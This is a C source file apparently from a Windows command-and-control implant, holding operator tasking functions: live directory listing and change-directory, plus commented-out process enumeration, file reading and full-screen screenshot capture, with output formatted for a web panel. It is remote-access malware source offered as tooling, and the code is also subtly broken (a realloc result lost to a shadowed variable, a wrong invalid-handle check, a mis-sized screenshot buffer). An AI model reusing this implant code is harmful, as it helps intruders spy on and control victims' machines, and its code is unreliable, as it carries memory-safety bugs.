//
// Created by j4ck on 3/15/24.
//
#include <windows.h>
#include <wchar.h>
#include <ntdef.h>
#include <winternl.h>
#include <stdio.h>
#include <shlwapi.h>
#include "../Include/Agent.h"
#include "../Include/Win32.h"

// Ipconfig (Get Network Adapter Information Win32::GetAdaptersInfo)

// List Directories
// TODO refactor and add swprintf instead of the garbage that is occuring below.
BOOL CommandListDirectory(IN PCHAR pTaskArgs, OUT PBYTE *pTaskOutput) { // Return Array or files.
    // If path is .. or . GetCurrentDirectory
    WIN32_FIND_DATAA fileData;
    HANDLE hFile;

    // Initial size is 1024
    DWORD lpBufferSize = 4096;
    char* tempBuffer= (char*)calloc(lpBufferSize, sizeof(char)); //TODO if this fails Change to malloc?

    DWORD  dwSize = 0;
    // If path ends in \ add *
    if (strlen(pTaskArgs) == 0) { // This means the operator called just "ls" (Use Current Directory)
        pTaskArgs = malloc(MAX_PATH * sizeof(char));
        DWORD dwRet = GetCurrentDirectoryA(MAX_PATH, pTaskArgs);
        if (dwRet ==0) {
            printf("[!] CommandListDirectory (GetCurrentDirectory) Failed %ld\n", GetLastError());
            return FALSE;
        }
    }
    if (pTaskArgs[strlen(pTaskArgs)-1] == '\\') {
        strcat_s(pTaskArgs, MAX_PATH, "*");
    }
    else if (pTaskArgs[strlen(pTaskArgs)-1] != '\\') {
        strcat_s(pTaskArgs, MAX_PATH, "\\*");
    }
    hFile = FindFirstFileA(pTaskArgs, &fileData);
    if (hFile == NULL) {
        printf("Failed to create file handle %ld\n", GetLastError());
    }
        strcat(tempBuffer, fileData.cFileName);
        strcat(tempBuffer, "<br>");
        dwSize += (strlen(fileData.cFileName) * sizeof(char));
    do {
        if ((dwSize + (strlen(fileData.cFileName) * sizeof(char))) >= lpBufferSize) {
            lpBufferSize += 1024;
            char* tempBuffer = realloc(tempBuffer, (lpBufferSize * sizeof(char)));
            printf("Reallocating buffer! Size: %ld\n", lpBufferSize);
        }
        strcat(tempBuffer, fileData.cFileName);
        strcat(tempBuffer, "<br>");
        dwSize += (strlen(fileData.cFileName) * sizeof(char));
    } while (FindNextFileA(hFile, &fileData));

    *pTaskOutput = (unsigned char*)tempBuffer;

    // Cleanup
    //VirtualFree(Agent->Config.CommandBuffer, 0, MEM_RELEASE); // TODO: FIX THIS
    CloseHandle(hFile);
    return TRUE;
}



BOOL CommandChangeDirectory(IN PCHAR pTaskArgs) {
    if (!SetCurrentDirectoryA(pTaskArgs)) {
        wprintf(L"[!] CommandChangeDirectory Failed %d\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}




/*





// TODO Loop through all processes first iteration, and allocate buffer depending on return value size.
BOOL CommandListProcesses() {
    fnNtQuerySystemInformation		                        pNtQuerySystemInformation   = NULL;
    ULONG							                        uReturnLen1                 = 0;
    ULONG                                                   uReturnLen2                 = 0;
    PSYSTEM_PROCESS_INFORMATION		                        SystemProcInfo              = NULL;

    PVOID							                        pValueToFree                = NULL;
    NTSTATUS						                        STATUS                      ;


    DWORD BUFFER_SIZE = 8000;
    PWCHAR tempBuffer = (WCHAR *)malloc(BUFFER_SIZE * sizeof(WCHAR));



    // Fetching NtQuerySystemInformation's address from ntdll.dll
    pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");
    if (pNtQuerySystemInformation == NULL) {
        wprintf(L"[!] GetProcAddress Failed With Error : %d\n", GetLastError());
    }

    // First NtQuerySystemInformation call - retrieve the size of the return buffer (uReturnLen1)
    STATUS = pNtQuerySystemInformation(SystemProcessInformation, NULL, 0, &uReturnLen1);
    if (NT_SUCCESS(STATUS) != TRUE && STATUS != 0xC0000004) {// STATUS_INFO_LENGTH_MISMATCH
        wprintf(L"[!] NtQuerySystemInformation [1] Failed With Error : 0x%0.8X \n", STATUS);
    }

    // Allocating buffer of size "uReturnLen1"
    SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
    if (SystemProcInfo == NULL) {
        wprintf(L"[!] HeapAlloc Failed With Error : %d\n", GetLastError());
        return FALSE;
    }

    // Setting a fixed variable to be used later to free, because "SystemProcInfo" will be modefied
    pValueToFree = SystemProcInfo;

    // Second NtQuerySystemInformation call - returning the SYSTEM_PROCESS_INFORMATION array (SystemProcInfo)
    STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
    if (NT_SUCCESS(STATUS) != TRUE) {
        wprintf(L"[!] NtQuerySystemInformation [2] Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    } else {
        // Enumerate each process.
        do {
            wchar_t wProcessOutputStr[200];   // Use an array which is large enough
            const size_t buffer_size = sizeof(wProcessOutputStr) / sizeof(wProcessOutputStr[0]);
            //swprintf(wProcessOutputStr, sizeof(wProcessOutputStr) / sizeof(wProcessOutputStr[0]), L"%ls\t\t\t%d\n", SystemProcInfo->ImageName.Buffer, HandleToULong(SystemProcInfo->UniqueProcessId));

            //wprintf(L"%-40ls%10d\n", SystemProcInfo->ImageName.Buffer, HandleToULong(SystemProcInfo->UniqueProcessId));
            swprintf(wProcessOutputStr, buffer_size, L"%40ls%10d<br>", SystemProcInfo->ImageName.Buffer, HandleToULong(SystemProcInfo->UniqueProcessId));
            wcscat(tempBuffer, wProcessOutputStr);

            SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)SystemProcInfo + SystemProcInfo->NextEntryOffset);

        } while (SystemProcInfo->NextEntryOffset != 0);

    }
    Agent->Config.CommandBuffer = tempBuffer;

    // TODO Add cleanup
    // Cleanup
    return TRUE;
}


BOOL CommandCat() {
    HANDLE hFile = NULL;
    DWORD dwBytesRead;
    hFile = CreateFileW(Agent->Config.CurrentTaskArgs, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] CommandCat Failed (CreateFileW) %d\n", GetLastError());
        return FALSE;
    }
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == 0) {
        wprintf(L"[!] CommandCat Failed (GetFileSize) %d\n", GetLastError());
        return FALSE;
    }
    PWCHAR pwBuffer = (PWCHAR)malloc(dwFileSize);
    if (pwBuffer == NULL) {
        wprintf(L"[!] CommanCat Failed (malloc)");
        return FALSE;
    }
    if (!ReadFile(hFile, pwBuffer, dwFileSize, &dwBytesRead, NULL)) {
        wprintf(L"[!] CommandCat Failed (ReadFile) %d", GetLastError());
        return FALSE;
    }

    Agent->Config.CommandBuffer = pwBuffer;
    // Cleanup
    CloseHandle(hFile);
    return TRUE;
}

BOOL CommandPrintWorkingDirectory() {
    PWCHAR wpBuffer = malloc(MAX_PATH * sizeof(wchar_t));
    DWORD dwRet = GetCurrentDirectoryW(MAX_PATH, wpBuffer);
    if (dwRet ==0) {
        wprintf(L"[!] CommandPrintWorkingDirectory Failed %d\n", GetLastError());
        return FALSE;
    }
    Agent->Config.CommandBuffer = wpBuffer;
    return TRUE;
}





#define MAX_LOADSTRING 100
BYTE* CommandScreenshot() {
    HDC hdcScreen;
    HDC hdcMemDC = NULL;
    HBITMAP hbmScreen = NULL;
    BITMAP bmpScreen;
    BYTE* buffer = NULL;

    // Get the handle to the device context of the screen
    hdcScreen = GetDC(NULL);
    hdcMemDC = CreateCompatibleDC(hdcScreen);

    // Get the screen dimensions
    int screenWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    // Create a compatible bitmap with the screen
    hbmScreen = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    SelectObject(hdcMemDC, hbmScreen);

    // Bit block transfer into memory DC
    BitBlt(hdcMemDC, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

    // Get the bitmap's information
    GetObject(hbmScreen, sizeof(BITMAP), &bmpScreen);

    // Calculate the buffer size
    DWORD bmpSize = (((bmpScreen.bmWidth * 24 + 31) / 32) * 4) * bmpScreen.bmHeight;

    // Allocate memory for the buffer
    buffer = (BYTE*)malloc(bmpSize);
    if (buffer == NULL) {
        // Error: Failed to allocate memory
        DeleteObject(hbmScreen);
        DeleteDC(hdcMemDC);
        ReleaseDC(NULL, hdcScreen);
        return NULL;
    }

    // Retrieve the bitmap data directly into the buffer
    BITMAPINFO bmi;
    ZeroMemory(&bmi, sizeof(BITMAPINFO));
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = bmpScreen.bmWidth;
    bmi.bmiHeader.biHeight = -bmpScreen.bmHeight;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    GetDIBits(hdcMemDC, hbmScreen, 0, bmpScreen.bmHeight, buffer, &bmi, DIB_RGB_COLORS);

    // Clean up resources
    DeleteObject(hbmScreen);
    DeleteDC(hdcMemDC);
    ReleaseDC(NULL, hdcScreen);

    return buffer;
}
 */
